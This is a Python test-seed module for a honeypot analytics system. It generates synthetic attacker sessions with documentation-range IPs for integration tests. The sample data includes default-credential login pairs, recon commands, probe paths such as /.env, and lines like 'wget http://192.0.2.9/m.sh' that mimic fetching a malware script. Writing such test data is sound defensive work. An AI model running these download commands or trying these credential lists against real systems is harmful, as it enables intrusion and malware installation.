"""Seed helpers for the analytics integration tests (documentation IP ranges only)."""

import os
import random
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any

from sqlalchemy import insert, text
from sqlalchemy.ext.asyncio import AsyncEngine
from suckerpot_db import EventRow, SessionRow, create_engine, database_url_from_env

PORTS = {
    "ssh": 2222, "telnet": 2323, "web": 8080, "rdp": 3389, "redis": 6379, "docker": 2375,
    "mysql": 3306, "adb": 5555, "mssql": 1433, "smb": 4450, "sip": 5060, "synology": 5000,
}  # fmt: skip


def api_engine() -> AsyncEngine:
    """Engine using the read-only API role when its credentials are configured."""
    env = dict(os.environ)
    user, password = env.get("POSTGRES_API_USER"), env.get("POSTGRES_API_PASSWORD")
    if user and password:
        env["POSTGRES_USER"], env["POSTGRES_PASSWORD"] = user, password
    return create_engine(database_url_from_env(env), pool_size=2)


@asynccontextmanager
async def owner_engine() -> AsyncIterator[AsyncEngine]:
    engine = create_engine(pool_size=1)
    try:
        yield engine
    finally:
        await engine.dispose()


@dataclass
class Seed:
    events: list[dict[str, Any]] = field(default_factory=list)
    sessions: list[dict[str, Any]] = field(default_factory=list)

    def session(
        self,
        sid: str,
        sensor: str,
        ip: str,
        start: datetime,
        evs: list[tuple[float, str, dict[str, Any]]],
        *,
        tags: list[str] | None = None,
        geo: tuple[str | None, str | None, int | None, str | None] | None = None,
        success: bool = False,
        abuse: int | None = None,
        scanner: bool | None = None,
    ) -> None:
        country, city, asn, org = geo or (None, None, None, None)
        common: dict[str, Any] = {
            "country": country,
            "city": city,
            "asn": asn,
            "org": org,
            "abuse_score": abuse,
            "known_scanner": scanner,
            "tags": tags or [],
        }
        last = start
        for offset, etype, data in evs:
            ts = start + timedelta(seconds=offset)
            last = max(last, ts)
            self.events.append(
                {
                    "ts": ts,
                    "sensor": sensor,
                    "session_id": sid,
                    "type": etype,
                    "src_ip": ip,
                    "src_port": 40000,
                    "dst_port": PORTS[sensor],
                    "data": data,
                    **common,
                }
            )
        kinds = [e[1] for e in evs]
        self.sessions.append(
            {
                "session_id": sid,
                "sensor": sensor,
                "src_ip": ip,
                "src_port": 40000,
                "dst_port": PORTS[sensor],
                "started_at": start,
                "ended_at": last,
                "last_event_at": last,
                "event_count": len(evs),
                "login_attempts": kinds.count("login_attempt"),
                "login_success": success,
                "commands": kinds.count("command"),
                "downloads": kinds.count("download_attempt"),
                "http_requests": kinds.count("http_request"),
                **common,
            }
        )

    async def write(self, engine: AsyncEngine) -> None:
        async with engine.begin() as conn:
            await conn.execute(text("TRUNCATE events, sessions"))
            if self.sessions:
                await conn.execute(insert(SessionRow), self.sessions)
            if self.events:
                await conn.execute(insert(EventRow), self.events)


def login(user: str, pw: str, ok: bool = False) -> tuple[float, str, dict[str, Any]]:
    return (1.0, "login_attempt", {"username": user, "password": pw, "success": ok})


def small_dataset(base: datetime) -> Seed:
    """Three attackers on three sensors; `base` is an hour boundary."""
    seed = Seed()
    do = ("NL", "Amsterdam", 14061, "DigitalOcean, LLC")
    seed.session(
        "a1",
        "ssh",
        "203.0.113.7",
        base - timedelta(minutes=30),
        [
            (0.0, "connect", {}),
            login("root", "admin"),
            login("root", "123456"),
            login("admin", "admin", True),
            (5.0, "command", {"input": "uname -a"}),
            (6.0, "command", {"input": "uname -a"}),
            (7.0, "download_attempt", {"url": "http://192.0.2.50/x.sh", "tool": "wget"}),
            (9.0, "disconnect", {}),
        ],
        tags=["crypto-miner", "recon"],
        geo=do,
        success=True,
        abuse=80,
        scanner=False,
    )
    seed.session(
        "a2",
        "ssh",
        "203.0.113.7",
        base - timedelta(hours=5),
        [(0.0, "connect", {}), login("root", "toor"), (3.0, "disconnect", {})],
        tags=["brute-force"],
        geo=do,
        abuse=80,
        scanner=False,
    )
    seed.session(
        "b1",
        "web",
        "198.51.100.9",
        base - timedelta(minutes=10),
        [
            (0.0, "connect", {}),
            (1.0, "http_request", {"path": "/index.php?a=1", "user_agent": "curl/8.5"}),
            (2.0, "http_request", {"path": "/index.php?a=1", "user_agent": "curl/8.5"}),
            (3.0, "download_attempt", {"url": "http://192.0.2.50/y.sh"}),
        ],
        tags=["php2shell"],
        geo=("US", "Ashburn", 15169, "Example Cloud"),
        scanner=True,
    )
    seed.session(
        "c1",
        "telnet",
        "2001:db8::5",
        base - timedelta(days=2, hours=1),
        [(0.0, "connect", {}), login("root", "xc3511"), (4.0, "disconnect", {})],
        tags=["mirai"],
        geo=("NL", "Amsterdam", 14061, "DigitalOcean, LLC"),
    )
    return seed


def big_dataset(base: datetime, n_sessions: int = 3000, seed_value: int = 7) -> Seed:
    """Roughly 3000 sessions / 25k events over 7 days with a realistic sensor mix."""
    rng = random.Random(seed_value)  # noqa: S311 - test data only
    out = Seed()
    ips = (
        [f"203.0.113.{i}" for i in range(1, 255)]
        + [f"198.51.100.{i}" for i in range(1, 255)]
        + [f"192.0.2.{i}" for i in range(1, 255)]
        + [f"2001:db8::{i:x}" for i in range(1, 200)]
    )
    geos = [
        ("NL", "Amsterdam", 14061, "DigitalOcean, LLC"),
        ("US", "Ashburn", 16509, "Example Cloud"),
        ("CN", "Beijing", 4134, "Example Telecom"),
        ("RU", "Moscow", 12389, "Example ISP"),
        ("BR", "Sao Paulo", 18881, "Example Net"),
        (None, None, None, None),
    ]
    ip_geo = {ip: rng.choice(geos) for ip in ips}
    users = ["root", "admin", "user", "ubuntu", "test", "pi", "oracle", "git", "postgres"]
    pws = ["123456", "admin", "password", "root", "toor", "1234", "qwerty", "letmein"]
    cmds = [
        "uname -a",
        "cat /proc/cpuinfo",
        "wget http://192.0.2.9/m.sh",
        "id",
        "ls -la",
        "free -m",
    ]
    paths = ["/", "/index.php", "/wp-login.php", "/.env", "/admin", "/cgi-bin/x", "/phpmyadmin/"]
    tags_pool = ["recon", "brute-force", "mirai", "crypto-miner", "php2shell", "malware-drop"]
    sensors = ["ssh"] * 5 + ["telnet"] * 2 + ["web"] * 4 + ["rdp"]
    total_target = 25000
    per_session = total_target // n_sessions
    for i in range(n_sessions):
        sensor = rng.choice(sensors)
        ip = rng.choice(ips)
        start = base - timedelta(seconds=rng.uniform(0, 7 * 86400))
        evs: list[tuple[float, str, dict[str, Any]]] = [(0.0, "connect", {})]
        for k in range(max(1, int(rng.gauss(per_session - 2, 3)))):
            t = 1.0 + k
            if sensor in ("ssh", "telnet"):
                if rng.random() < 0.6:
                    evs.append(login(rng.choice(users), rng.choice(pws), rng.random() < 0.05))
                else:
                    evs.append((t, "command", {"input": rng.choice(cmds)}))
            elif sensor == "web":
                evs.append(
                    (t, "http_request", {"path": rng.choice(paths), "user_agent": f"bot/{k % 4}"})
                )
            else:
                evs.append((t, "scan", {"x": 1}))
        evs.append((float(len(evs)) + 1, "disconnect", {}))
        out.session(
            f"big-{i}",
            sensor,
            ip,
            start,
            evs,
            tags=rng.sample(tags_pool, rng.randint(0, 2)),
            geo=ip_geo[ip],
            abuse=rng.choice([None, 0, 25, 80, 100]),
            scanner=rng.choice([None, True, False]),
        )
    return out
